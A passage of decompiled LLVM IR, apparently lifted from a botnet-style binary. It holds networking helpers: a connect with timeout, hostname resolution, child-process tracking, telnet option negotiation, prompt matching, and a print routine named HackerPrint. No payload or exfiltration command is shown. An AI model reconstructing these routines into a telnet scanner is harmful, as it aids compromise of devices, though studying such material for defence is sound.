  %v1_9a20 = urem i32 %arg1, 32
  %v6_9a28 = shl i32 1, %v1_9a20
  %v2_9a2c = or i32 %v2_9a18, %v6_9a28
  store i32 %v2_9a2c, i32* %v1_9a18, align 4
  %v1_9a4c = add i32 %arg1, 1
  %v2_9a58 = ptrtoint i32* %stack_var_-184 to i32
  store i32 0, i32* @r2, align 4
  %v5_9a6c = call i32 @__libc_select(i32 %v1_9a4c, i32 %v2_99bc, i32 0, i32 %v2_99bc, i32 %v2_9a58)
  %v5_9a80 = icmp sgt i32 %v5_9a6c, 0
  br i1 %v5_9a80, label %dec_label_pc_9c14.preheader, label %dec_label_pc_9b80.preheader

dec_label_pc_9b80.preheader:                      ; preds = %dec_label_pc_99f8
  %v7_9b8824 = icmp slt i32 %tmp34, 10
  br i1 %v7_9b8824, label %dec_label_pc_9ac0.lr.ph, label %dec_label_pc_9c14.preheader

dec_label_pc_9ac0.lr.ph:                          ; preds = %dec_label_pc_9b80.preheader, %dec_label_pc_9b74
  %stack_var_-44.025 = phi i32 [ %v1_9b78, %dec_label_pc_9b74 ], [ %tmp34, %dec_label_pc_9b80.preheader ]
  %v2_9a8c = load i32, i32* @global_var_2e45c.55, align 4
  %v3_9a98 = call i32 @HackerPrint(i32 %v2_9a8c, i32 ptrtoint ([5 x i8]* @global_var_1f934.57 to i32))
  store i32 30, i32* %stack_var_-184, align 4
  br label %dec_label_pc_9ac0

dec_label_pc_9ac0:                                ; preds = %dec_label_pc_9ac0.lr.ph, %dec_label_pc_9ac0
  %storemerge716 = phi i32 [ 0, %dec_label_pc_9ac0.lr.ph ], [ %v1_9ad4, %dec_label_pc_9ac0 ]
  %v5_9acc = mul nuw nsw i32 %storemerge716, 4
  %v6_9acc = add i32 %v5_9acc, %v2_99bc
  %v7_9acc = inttoptr i32 %v6_9acc to i32*
  store i32 0, i32* %v7_9acc, align 4
  %v1_9ad4 = add nuw nsw i32 %storemerge716, 1
  %tmp54 = icmp ult i32 %v1_9ad4, 32
  br i1 %tmp54, label %dec_label_pc_9ac0, label %dec_label_pc_9ae8

dec_label_pc_9ae8:                                ; preds = %dec_label_pc_9ac0
  %v2_9b08 = load i32, i32* %v1_9a18, align 4
  %v2_9b1c = or i32 %v2_9b08, %v6_9a28
  store i32 %v2_9b1c, i32* %v1_9a18, align 4
  store i32 0, i32* @r2, align 4
  %v5_9b5c = call i32 @__libc_select(i32 %v1_9a4c, i32 %v2_99bc, i32 0, i32 %v2_99bc, i32 %v2_9a58)
  %v5_9b70 = icmp sgt i32 %v5_9b5c, 0
  br i1 %v5_9b70, label %dec_label_pc_9c14.preheader, label %dec_label_pc_9b74

dec_label_pc_9b74:                                ; preds = %dec_label_pc_9ae8
  %v1_9b78 = add nsw i32 %stack_var_-44.025, 1
  %v7_9b88 = icmp slt i32 %v1_9b78, 10
  br i1 %v7_9b88, label %dec_label_pc_9ac0.lr.ph, label %dec_label_pc_9c14.preheader

dec_label_pc_9c14.preheader:                      ; preds = %dec_label_pc_9b74, %dec_label_pc_9ae8, %dec_label_pc_9b80.preheader, %dec_label_pc_99f8
  %v5_9bbc = bitcast i8* %stack_var_-185 to i32*
  %not.v7_9c1c58 = icmp sgt i32 %arg3, 1
  %v2_9c3460 = icmp eq i1 %not.v7_9c1c58, false
  br i1 %v2_9c3460, label %dec_label_pc_9c3c, label %dec_label_pc_9ba0

dec_label_pc_9ba0:                                ; preds = %dec_label_pc_9c14.preheader, %dec_label_pc_9c08
  %v1_9c1863.in = phi i32 [ %v1_9c1863, %dec_label_pc_9c08 ], [ %arg3, %dec_label_pc_9c14.preheader ]
  %stack_var_-40.062 = phi i8* [ %v5_9bf8, %dec_label_pc_9c08 ], [ %arg2, %dec_label_pc_9c14.preheader ]
  %stack_var_-36.061 = phi i32 [ %v1_9c0c, %dec_label_pc_9c08 ], [ 0, %dec_label_pc_9c14.preheader ]
  %v1_9c1863 = add i32 %v1_9c1863.in, -1
  %v2_9ba4 = load i32, i32* @global_var_2e45c.55, align 4
  %v6_9bbc = call i32 @__libc_recv(i32 %v2_9ba4, i32* %v5_9bbc, i32 1, i32 0, i32 %v1_9c1863)
  %v7_9bc4 = icmp eq i32 %v6_9bbc, 1
  br i1 %v7_9bc4, label %dec_label_pc_9be4, label %dec_label_pc_9bcc

dec_label_pc_9bcc:                                ; preds = %dec_label_pc_9ba0
  store i8 0, i8* %stack_var_-40.062, align 1
  br label %dec_label_pc_9c50

dec_label_pc_9be4:                                ; preds = %dec_label_pc_9ba0
  %v3_9be4 = load i8, i8* %stack_var_-185, align 1
  %v4_9be8 = ptrtoint i8* %stack_var_-40.062 to i32
  store i8 %v3_9be4, i8* %stack_var_-40.062, align 1
  %v1_9bf4 = add i32 %v4_9be8, 1
  %v5_9bf8 = inttoptr i32 %v1_9bf4 to i8*
  %v3_9bfc = load i8, i8* %stack_var_-185, align 1
  %v7_9c00 = icmp eq i8 %v3_9bfc, 10
  br i1 %v7_9c00, label %dec_label_pc_9c3c, label %dec_label_pc_9c08

dec_label_pc_9c08:                                ; preds = %dec_label_pc_9be4
  %v1_9c0c = add i32 %stack_var_-36.061, 1
  %not.v7_9c1c = icmp sgt i32 %v1_9c1863, 1
  %v2_9c34 = icmp eq i1 %not.v7_9c1c, false
  br i1 %v2_9c34, label %dec_label_pc_9c3c, label %dec_label_pc_9ba0

dec_label_pc_9c3c:                                ; preds = %dec_label_pc_9be4, %dec_label_pc_9c08, %dec_label_pc_9c14.preheader
  %stack_var_-36.0.lcssa = phi i32 [ 0, %dec_label_pc_9c14.preheader ], [ %v1_9c0c, %dec_label_pc_9c08 ], [ %stack_var_-36.061, %dec_label_pc_9be4 ]
  %stack_var_-40.1 = phi i8* [ %arg2, %dec_label_pc_9c14.preheader ], [ %v5_9bf8, %dec_label_pc_9c08 ], [ %v5_9bf8, %dec_label_pc_9be4 ]
  store i8 0, i8* %stack_var_-40.1, align 1
  br label %dec_label_pc_9c50

dec_label_pc_9c50:                                ; preds = %dec_label_pc_9bcc, %dec_label_pc_9c3c
  %storemerge = phi i32 [ -1, %dec_label_pc_9bcc ], [ %stack_var_-36.0.lcssa, %dec_label_pc_9c3c ]
  %v2_9c5c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_9c5c, i32* @fp, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_9c1863, { 1, 0, 2 }
  uselistorder i8* %stack_var_-40.062, { 1, 2, 0 }
  uselistorder i32 %v1_9b78, { 1, 0 }
  uselistorder i32 %storemerge716, { 1, 0 }
  uselistorder i32 %storemerge628, { 1, 0 }
  uselistorder i32 %v2_99bc, { 4, 3, 0, 5, 2, 1 }
  uselistorder i32* %stack_var_-16, { 0, 2, 1 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-184, { 0, 2, 1 }
  uselistorder i8* %stack_var_-185, { 2, 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_9c50, { 1, 0 }
  uselistorder label %dec_label_pc_9c3c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_9ba0, { 1, 0 }
  uselistorder label %dec_label_pc_9ac0, { 1, 0 }
  uselistorder label %dec_label_pc_9ac0.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_99d0, { 1, 0 }
}

define i32 @hostname_to_ip(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  store i32 40052, i32* %stack_var_-4, align 4
  %v2_9c70 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_9c70, i32* @fp, align 4
  store i32 %arg1, i32* @r0, align 4
  %v1_9c84 = call i32 @__GI_gethostbyname(i32 %arg1)
  %v2_9c94 = icmp eq i32 %v1_9c84, 0
  br i1 %v2_9c94, label %dec_label_pc_9c9c, label %dec_label_pc_9cb0

dec_label_pc_9c9c:                                ; preds = %entry
  %v3_9ca0 = call i32 @__GI_herror(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1f93c.59, i32 0, i32 0))
  br label %dec_label_pc_9d28

dec_label_pc_9cb0:                                ; preds = %entry
  %v1_9cb4 = add i32 %v1_9c84, 16
  %v2_9cb4 = inttoptr i32 %v1_9cb4 to i32*
  %v3_9cb4 = load i32, i32* %v2_9cb4, align 4
  %v1_9cd8 = inttoptr i32 %v3_9cb4 to i32*
  %v2_9cd8 = load i32, i32* %v1_9cd8, align 4
  %v2_9cdc = icmp eq i32 %v2_9cd8, 0
  br i1 %v2_9cdc, label %dec_label_pc_9d20, label %dec_label_pc_9ce4

dec_label_pc_9ce4:                                ; preds = %dec_label_pc_9cb0
  %v2_9cf8 = load i32, i32* %v1_9cd8, align 4
  %v1_9cfc = inttoptr i32 %v2_9cf8 to i32*
  %v2_9cfc = load i32, i32* %v1_9cfc, align 4
  store i32 %v2_9cfc, i32* @r0, align 4
  %v1_9d00 = call i32 @__GI_inet_ntoa(i32 %v2_9cfc)
  store i32 %v1_9d00, i32* @r1, align 4
  %v2_9d10 = inttoptr i32 %arg2 to i8*
  %v3_9d10 = call i32 @strcpy(i8* %v2_9d10, i32 %v1_9d00)
  br label %dec_label_pc_9d28

dec_label_pc_9d20:                                ; preds = %dec_label_pc_9cb0
  br label %dec_label_pc_9d28

dec_label_pc_9d28:                                ; preds = %dec_label_pc_9ce4, %dec_label_pc_9c9c, %dec_label_pc_9d20
  %v3_9d28 = phi i32 [ 0, %dec_label_pc_9ce4 ], [ 1, %dec_label_pc_9c9c ], [ 1, %dec_label_pc_9d20 ]
  ret i32 %v3_9d28

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_9d28, { 2, 0, 1 }
}

define i32 @connectTimeout(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg4, i32* @r3, align 4
  %stack_var_-192 = alloca i32, align 4
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_9d40 = load i32, i32* @fp, align 4
  store i32 %v3_9d40, i32* %stack_var_-16, align 4
  %v13_9d40 = ptrtoint i32* %stack_var_-16 to i32
  %v2_9d68 = call i32 @__libc_fcntl(i32 %arg1, i32 3)
  %v1_9d78 = or i32 %v2_9d68, 2048
  store i32 %v1_9d78, i32* @r3, align 4
  %v2_9d8c = call i32 @__libc_fcntl(i32 %arg1, i32 4)
  store i32 2, i32* %stack_var_-48, align 4
  %v3_9da8 = urem i32 %arg3, 65536
  %v1_9db0 = call i32 @__GI_htons(i32 %v3_9da8)
  %v3_9dd8 = call i32 @getHost(i32 %arg2, i32* nonnull %stack_var_-44)
  %v2_9de0 = icmp eq i32 %v3_9dd8, 0
  br i1 %v2_9de0, label %dec_label_pc_9df4, label %dec_label_pc_9de8

dec_label_pc_9de8:                                ; preds = %entry
  br label %dec_label_pc_9fac

dec_label_pc_9df4:                                ; preds = %entry
  store i32 8, i32* @r2, align 4
  %v2_9e08 = bitcast i32* %stack_var_-40 to i8*
  %v3_9e08 = call i32 @__GI_memset(i8* %v2_9e08, i32 0)
  %v3_9e1c = bitcast i32* %stack_var_-48 to %sockaddr*
  %v4_9e1c = call i32 @__libc_connect(i32 %arg1, %sockaddr* %v3_9e1c, i32 16)
  store i32 %v4_9e1c, i32* @r3, align 4
  %v1_9e2c = icmp slt i32 %v4_9e1c, 0
  br i1 %v1_9e2c, label %dec_label_pc_9e34, label %dec_label_pc_9f70

dec_label_pc_9e34:                                ; preds = %dec_label_pc_9df4
  %v0_9e34 = call i32 @__GI___errno_location()
  %v1_9e3c = inttoptr i32 %v0_9e34 to i32*
  %v2_9e3c = load i32, i32* %v1_9e3c, align 4
  %v7_9e40 = icmp eq i32 %v2_9e3c, 115
  br i1 %v7_9e40, label %dec_label_pc_9e6c.lr.ph, label %dec_label_pc_9f64

dec_label_pc_9e6c.lr.ph:                          ; preds = %dec_label_pc_9e34
  store i32 %arg4, i32* %stack_var_-184, align 4
  %v2_9e58 = ptrtoint i32* %stack_var_-176 to i32
  br label %dec_label_pc_9e6c

dec_label_pc_9e6c:                                ; preds = %dec_label_pc_9e6c.lr.ph, %dec_label_pc_9e6c
  %storemerge14 = phi i32 [ 0, %dec_label_pc_9e6c.lr.ph ], [ %v1_9e80, %dec_label_pc_9e6c ]
  %v5_9e78 = mul nuw nsw i32 %storemerge14, 4
  %v6_9e78 = add i32 %v5_9e78, %v2_9e58
  %v7_9e78 = inttoptr i32 %v6_9e78 to i32*
  store i32 0, i32* %v7_9e78, align 4
  %v1_9e80 = add nuw nsw i32 %storemerge14, 1
  %tmp31 = icmp ult i32 %v1_9e80, 32
  br i1 %tmp31, label %dec_label_pc_9e6c, label %dec_label_pc_9e94

dec_label_pc_9e94:                                ; preds = %dec_label_pc_9e6c
  %v3_9e98 = udiv i32 %arg1, 32
  %v3_9ea4 = mul nuw nsw i32 %v3_9e98, 4
  %v2_9eac = add nsw i32 %v3_9ea4, -160
  %v2_9eb0 = add i32 %v2_9eac, %v13_9d40
  %v1_9eb4 = inttoptr i32 %v2_9eb0 to i32*
  %v2_9eb4 = load i32, i32* %v1_9eb4, align 4
  %v1_9ebc = urem i32 %arg1, 32
  %v6_9ec4 = shl i32 1, %v1_9ebc
  %v2_9ec8 = or i32 %v2_9eb4, %v6_9ec4
  store i32 %v2_9ec8, i32* %v1_9eb4, align 4
  %v1_9ee8 = add i32 %arg1, 1
  %v2_9ef0 = ptrtoint i32* %stack_var_-184 to i32
  %v5_9f08 = call i32 @__libc_select(i32 %v1_9ee8, i32 0, i32 %v2_9e58, i32 0, i32 %v2_9ef0)
  %tmp32 = icmp slt i32 %v5_9f08, 1
  br i1 %tmp32, label %dec_label_pc_9f58, label %dec_label_pc_9f18

dec_label_pc_9f18:                                ; preds = %dec_label_pc_9e94
  %v0_9f3c = call i32 @getsockopt()
  %v3_9f40 = load i32, i32* %stack_var_-192, align 4
  store i32 %v3_9f40, i32* @r3, align 4
  %v2_9f44 = icmp eq i32 %v3_9f40, 0
  br i1 %v2_9f44, label %dec_label_pc_9f70, label %dec_label_pc_9f4c

dec_label_pc_9f4c:                                ; preds = %dec_label_pc_9f18
  br label %dec_label_pc_9fac

dec_label_pc_9f58:                                ; preds = %dec_label_pc_9e94
  br label %dec_label_pc_9fac

dec_label_pc_9f64:                                ; preds = %dec_label_pc_9e34
  br label %dec_label_pc_9fac

dec_label_pc_9f70:                                ; preds = %dec_label_pc_9df4, %dec_label_pc_9f18
  %v2_9f7c = call i32 @__libc_fcntl(i32 %arg1, i32 3)
  %v1_9f8c = and i32 %v2_9f7c, -2049
  store i32 %v1_9f8c, i32* @r3, align 4
  %v2_9fa0 = call i32 @__libc_fcntl(i32 %arg1, i32 4)
  br label %dec_label_pc_9fac

dec_label_pc_9fac:                                ; preds = %dec_label_pc_9f64, %dec_label_pc_9f58, %dec_label_pc_9f4c, %dec_label_pc_9de8, %dec_label_pc_9f70
  %stack_var_-212.0 = phi i32 [ 0, %dec_label_pc_9f58 ], [ 1, %dec_label_pc_9f70 ], [ 0, %dec_label_pc_9f4c ], [ 0, %dec_label_pc_9f64 ], [ 0, %dec_label_pc_9de8 ]
  ret i32 %stack_var_-212.0

; uselistorder directives
  uselistorder i32 %storemerge14, { 1, 0 }
  uselistorder i32 %v2_9e58, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-184, { 1, 0 }
  uselistorder i32 %arg1, { 2, 3, 4, 1, 0, 5, 6, 7 }
  uselistorder label %dec_label_pc_9fac, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_9f70, { 1, 0 }
  uselistorder label %dec_label_pc_9e6c, { 1, 0 }
}

define i32 @listFork() local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v3_9fc0 = load i32, i32* @r4, align 4
  %v6_9fc0 = load i32, i32* @r5, align 4
  %v9_9fc0 = load i32, i32* @r6, align 4
  %v12_9fc0 = load i32, i32* @fp, align 4
  store i32 40904, i32* %stack_var_-4, align 4
  %v2_9fc4 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_9fc4, i32* @fp, align 4
  %v0_9fcc = call i32 @__libc_fork()
  %v2_9fdc = icmp eq i32 %v0_9fcc, 0
  br i1 %v2_9fdc, label %dec_label_pc_a148, label %dec_label_pc_9ff0

dec_label_pc_9ff0:                                ; preds = %entry
  %v2_9ff4 = load i32, i32* @global_var_2e460.61, align 4
  %v5_9ff4 = load i32, i32* @global_var_2e464.62, align 4
  %v2_a000 = add i32 %v2_9ff4, 1
  %v3_a000 = icmp eq i32 %v2_a000, 0
  %v4_a004 = zext i1 %v3_a000 to i32
  %v5_a004 = add i32 %v4_a004, %v5_9ff4
  store i32 %v2_a000, i32* @global_var_2e460.61, align 4
  store i32 %v5_a004, i32* @global_var_2e464.62, align 4
  %v2_a020 = add i32 %v2_9ff4, 2
  %v3_a020 = icmp eq i32 %v2_a000, -1
  %v4_a024 = zext i1 %v3_a020 to i32
  %v5_a024 = add i32 %v5_a004, %v4_a024
  %v3_a028 = udiv i32 %v2_a020, 1073741824
  %v3_a02c = mul i32 %v5_a024, 4
  %v2_a030 = or i32 %v3_a02c, %v3_a028
  store i32 %v2_a030, i32* @r4, align 4
  %v3_a034 = mul i32 %v2_a020, 4
  %v1_a03c = call i32 @malloc(i32 %v3_a034)
  br label %dec_label_pc_a094

dec_label_pc_a054:                                ; preds = %dec_label_pc_a094, %dec_label_pc_a0e0
  %v3_a058 = mul i32 %storemerge2, 4
  %v2_a064 = add i32 %v3_a058, %v1_a03c
  %v2_a078 = load i32, i32* @global_var_346c0.64, align 4
  %v2_a07c = add i32 %v2_a078, %v3_a058
  %v1_a080 = inttoptr i32 %v2_a07c to i32*
  %v2_a080 = load i32, i32* %v1_a080, align 4
  %v2_a084 = inttoptr i32 %v2_a064 to i32*
  store i32 %v2_a080, i32* %v2_a084, align 4
  %v1_a08c = add i32 %storemerge2, 1
  br label %dec_label_pc_a094

dec_label_pc_a094:                                ; preds = %dec_label_pc_9ff0, %dec_label_pc_a054
  %storemerge2 = phi i32 [ 0, %dec_label_pc_9ff0 ], [ %v1_a08c, %dec_label_pc_a054 ]
  %v2_a0ac = load i32, i32* @global_var_2e460.61, align 4
  %v5_a0ac = load i32, i32* @global_var_2e464.62, align 4
  %v2_a0c0 = add i32 %v2_a0ac, -1
  %v3_a0c0 = icmp ne i32 %v2_a0ac, 0
  %v3_a0c4 = add i32 %v5_a0ac, -1
  %v5_a0c4 = sext i1 %v3_a0c0 to i32
  %v9_a0d8 = icmp eq i32 %v3_a0c4, %v5_a0c4
  br i1 %v9_a0d8, label %dec_label_pc_a0e0, label %dec_label_pc_a054

dec_label_pc_a0e0:                                ; preds = %dec_label_pc_a094
  store i32 %v2_a0c0, i32* @r5, align 4
  store i32 %storemerge2, i32* @r6, align 4
  %tmp = icmp ugt i32 %v2_a0c0, %storemerge2
  br i1 %tmp, label %dec_label_pc_a054, label %dec_label_pc_a100

dec_label_pc_a100:                                ; preds = %dec_label_pc_a0e0
  store i32 %v5_a0ac, i32* @r4, align 4
  %v3_a108 = mul i32 %v2_a0ac, 4
  %v1_a10c = add i32 %v1_a03c, -4
  %v2_a118 = add i32 %v1_a10c, %v3_a108
  %v2_a120 = inttoptr i32 %v2_a118 to i32*
  store i32 %v0_9fcc, i32* %v2_a120, align 4
  %v2_a128 = load i32, i32* @global_var_346c0.64, align 4
  store i32 %v2_a128, i32* @r0, align 4
  %v0_a130 = call i32 @free()
  store i32 ptrtoint (i32* @global_var_346c0.64 to i32), i32* @r2, align 4
  store i32 %v1_a03c, i32* @global_var_346c0.64, align 4
  br label %dec_label_pc_a148

dec_label_pc_a148:                                ; preds = %entry, %dec_label_pc_a100
  store i32 %v3_9fc0, i32* @r4, align 4
  store i32 %v6_9fc0, i32* @r5, align 4
  store i32 %v9_9fc0, i32* @r6, align 4
  store i32 %v12_9fc0, i32* @fp, align 4
  ret i32 %v0_9fcc

; uselistorder directives
  uselistorder i32 %storemerge2, { 0, 2, 1, 3 }
  uselistorder i32 %v3_a058, { 1, 0 }
  uselistorder i32 %v1_a03c, { 2, 0, 1 }
  uselistorder i32 %v2_a000, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder label %dec_label_pc_a148, { 1, 0 }
  uselistorder label %dec_label_pc_a094, { 1, 0 }
  uselistorder label %dec_label_pc_a054, { 1, 0 }
}

define i32 @negotiate(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-17 = alloca i8, align 1
  %v1_a180 = add i32 %arg2, 1
  %v1_a184 = inttoptr i32 %v1_a180 to i8*
  %v2_a184 = load i8, i8* %v1_a184, align 1
  %v7_a190 = icmp ult i8 %v2_a184, -5
  br i1 %v7_a190, label %dec_label_pc_a2dc, label %dec_label_pc_a198

dec_label_pc_a198:                                ; preds = %entry
  %v7_a1a0 = icmp eq i8 %v2_a184, -1
  br i1 %v7_a1a0, label %dec_label_pc_a1a4, label %dec_label_pc_a1c0

dec_label_pc_a1a4:                                ; preds = %dec_label_pc_a198
  br label %dec_label_pc_a2dc

dec_label_pc_a1c0:                                ; preds = %dec_label_pc_a198
  store i8 -1, i8* %stack_var_-17, align 1
  %v5_a1dc = bitcast i8* %stack_var_-17 to i32*
  %v6_a1dc = call i32 @__libc_send(i32 %arg1, i32* %v5_a1dc, i32 1, i32 16384)
  %v2_a1e8 = load i8, i8* %v1_a184, align 1
  %v7_a1ec = icmp eq i8 %v2_a1e8, -4
  br i1 %v7_a1ec, label %dec_label_pc_a1f4, label %dec_label_pc_a200

dec_label_pc_a1f4:                                ; preds = %dec_label_pc_a1c0
  store i8 -2, i8* %stack_var_-17, align 1
  br label %dec_label_pc_a2a0

dec_label_pc_a200:                                ; preds = %dec_label_pc_a1c0
  %v2_a208 = load i8, i8* %v1_a184, align 1
  %v7_a20c = icmp eq i8 %v2_a208, -2
  br i1 %v7_a20c, label %dec_label_pc_a214, label %dec_label_pc_a220

dec_label_pc_a214:                                ; preds = %dec_label_pc_a200
  store i8 -4, i8* %stack_var_-17, align 1
  br label %dec_label_pc_a2a0

dec_label_pc_a220:                                ; preds = %dec_label_pc_a200
  %v2_a228 = load i8, i8* %v1_a184, align 1
  %v7_a22c = icmp eq i8 %v2_a228, 3
  %v7_a240 = icmp eq i8 %v2_a228, -3
  br i1 %v7_a22c, label %dec_label_pc_a234, label %dec_label_pc_a26c

dec_label_pc_a234:                                ; preds = %dec_label_pc_a220
  br i1 %v7_a240, label %dec_label_pc_a248, label %dec_label_pc_a254

dec_label_pc_a248:                                ; preds = %dec_label_pc_a234
  br label %dec_label_pc_a25c

dec_label_pc_a254:                                ; preds = %dec_label_pc_a234
  br label %dec_label_pc_a25c

dec_label_pc_a25c:                                ; preds = %dec_label_pc_a248, %dec_label_pc_a254
  %storemerge = phi i8 [ -3, %dec_label_pc_a254 ], [ -5, %dec_label_pc_a248 ]
  store i8 %storemerge, i8* %stack_var_-17, align 1
  br label %dec_label_pc_a2a0

dec_label_pc_a26c:                                ; preds = %dec_label_pc_a220
  br i1 %v7_a240, label %dec_label_pc_a280, label %dec_label_pc_a28c

dec_label_pc_a280:                                ; preds = %dec_label_pc_a26c
  br label %dec_label_pc_a294

dec_label_pc_a28c:                                ; preds = %dec_label_pc_a26c
  br label %dec_label_pc_a294

dec_label_pc_a294:                                ; preds = %dec_label_pc_a280, %dec_label_pc_a28c
  %storemerge4 = phi i8 [ -2, %dec_label_pc_a28c ], [ -4, %dec_label_pc_a280 ]
  store i8 %storemerge4, i8* %stack_var_-17, align 1
  br label %dec_label_pc_a2a0

dec_label_pc_a2a0:                                ; preds = %dec_label_pc_a25c, %dec_label_pc_a214, %dec_label_pc_a1f4, %dec_label_pc_a294
  %v5_a2b4 = call i32 @__libc_send(i32 %arg1, i32* nonnull %v5_a1dc, i32 1, i32 16384)
  %v1_a2bc = add i32 %arg2, 2
  %v4_a2d0 = inttoptr i32 %v1_a2bc to i32*
  %v5_a2d0 = call i32 @__libc_send(i32 %arg1, i32* %v4_a2d0, i32 1, i32 16384)
  br label %dec_label_pc_a2dc

dec_label_pc_a2dc:                                ; preds = %dec_label_pc_a1a4, %dec_label_pc_a2a0, %entry
  ret i32 0

; uselistorder directives
  uselistorder i8* %stack_var_-17, { 5, 4, 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_a2dc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_a2a0, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_a294, { 1, 0 }
  uselistorder label %dec_label_pc_a25c, { 1, 0 }
}

define i32 @matchPrompt(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v3_a30c = call i32 @strlen(i8* %arg1)
  %v2_a354 = add i32 %v3_a30c, %tmp
  br label %dec_label_pc_a428

dec_label_pc_a32c:                                ; preds = %dec_label_pc_a3b4, %dec_label_pc_a390, %dec_label_pc_a36c, %dec_label_pc_a348
  %v1_a330 = add nsw i32 %stack_var_-24.013, 1
  %v7_a344 = icmp sgt i32 %v3_a30c, %v1_a330
  br i1 %v7_a344, label %dec_label_pc_a348, label %dec_label_pc_a3d8

dec_label_pc_a348:                                ; preds = %dec_label_pc_a338.preheader, %dec_label_pc_a32c
  %stack_var_-24.013 = phi i32 [ %v1_a330, %dec_label_pc_a32c ], [ %stack_var_-24.1, %dec_label_pc_a338.preheader ]
  %v2_a35c = sub i32 %v2_a354, %stack_var_-24.013
  %v1_a360 = inttoptr i32 %v2_a35c to i8*
  %v2_a360 = load i8, i8* %v1_a360, align 1
  %v2_a364 = icmp eq i8 %v2_a360, 0
  br i1 %v2_a364, label %dec_label_pc_a32c, label %dec_label_pc_a36c

dec_label_pc_a36c:                                ; preds = %dec_label_pc_a348
  %v2_a384 = load i8, i8* %v1_a360, align 1
  %v7_a388 = icmp eq i8 %v2_a384, 32
  br i1 %v7_a388, label %dec_label_pc_a32c, label %dec_label_pc_a390

dec_label_pc_a390:                                ; preds = %dec_label_pc_a36c
  %v2_a3a8 = load i8, i8* %v1_a360, align 1
  %v7_a3ac = icmp eq i8 %v2_a3a8, 13
  br i1 %v7_a3ac, label %dec_label_pc_a32c, label %dec_label_pc_a3b4

dec_label_pc_a3b4:                                ; preds = %dec_label_pc_a390
  %v2_a3cc = load i8, i8* %v1_a360, align 1
  %v7_a3d0 = icmp eq i8 %v2_a3cc, 10
  br i1 %v7_a3d0, label %dec_label_pc_a32c, label %dec_label_pc_a3d8

dec_label_pc_a3d8:                                ; preds = %dec_label_pc_a3b4, %dec_label_pc_a32c, %dec_label_pc_a338.preheader
  %stack_var_-24.0.lcssa = phi i32 [ %stack_var_-24.1, %dec_label_pc_a338.preheader ], [ %stack_var_-24.013, %dec_label_pc_a3b4 ], [ %v1_a330, %dec_label_pc_a32c ]
  %v2_a3ec = sub i32 %v2_a354, %stack_var_-24.0.lcssa
  %v1_a3f0 = inttoptr i32 %v2_a3ec to i8*
  %v2_a3f0 = load i8, i8* %v1_a3f0, align 1
  %v2_a400 = add i32 %storemerge2, ptrtoint ([6 x i8]* @global_var_1f94c.66 to i32)
  %v1_a404 = inttoptr i32 %v2_a400 to i8*
  %v2_a404 = load i8, i8* %v1_a404, align 1
  %v9_a408 = icmp eq i8 %v2_a3f0, %v2_a404
  %v1_a420 = add i32 %storemerge2, 1
  br i1 %v9_a408, label %dec_label_pc_a448, label %dec_label_pc_a428

dec_label_pc_a428:                                ; preds = %dec_label_pc_a3d8, %entry
  %stack_var_-24.1 = phi i32 [ 0, %entry ], [ %stack_var_-24.0.lcssa, %dec_label_pc_a3d8 ]
  %storemerge2 = phi i32 [ 0, %entry ], [ %v1_a420, %dec_label_pc_a3d8 ]
  %v3_a430 = call i32 @strlen(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1f94c.66, i32 0, i32 0))
  %v3_a438 = icmp ult i32 %storemerge2, %v3_a430
  br i1 %v3_a438, label %dec_label_pc_a338.preheader, label %dec_label_pc_a448

dec_label_pc_a338.preheader:                      ; preds = %dec_label_pc_a428
  %v7_a34412 = icmp sgt i32 %v3_a30c, %stack_var_-24.1
  br i1 %v7_a34412, label %dec_label_pc_a348, label %dec_label_pc_a3d8

dec_label_pc_a448:                                ; preds = %dec_label_pc_a428, %dec_label_pc_a3d8
  %storemerge3 = phi i32 [ 1, %dec_label_pc_a3d8 ], [ 0, %dec_label_pc_a428 ]
  ret i32 %storemerge3

; uselistorder directives
  uselistorder i32 %stack_var_-24.1, { 2, 0, 1 }
  uselistorder i32 %stack_var_-24.0.lcssa, { 1, 0 }
  uselistorder i32 %v3_a30c, { 1, 2, 0 }
  uselistorder label %dec_label_pc_a3d8, { 2, 0, 1 }
}

define i32 @readUntil(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_a460 = load i32, i32* @fp, align 4
  store i32 %v3_a460, i32* %stack_var_-16, align 4
  %v13_a460 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %arg4, i32* %stack_var_-176, align 4
  %v2_a4b0 = ptrtoint i32* %stack_var_-168 to i32
  %v3_a4f0 = udiv i32 %arg1, 32
  %v3_a4fc = mul nuw nsw i32 %v3_a4f0, 4
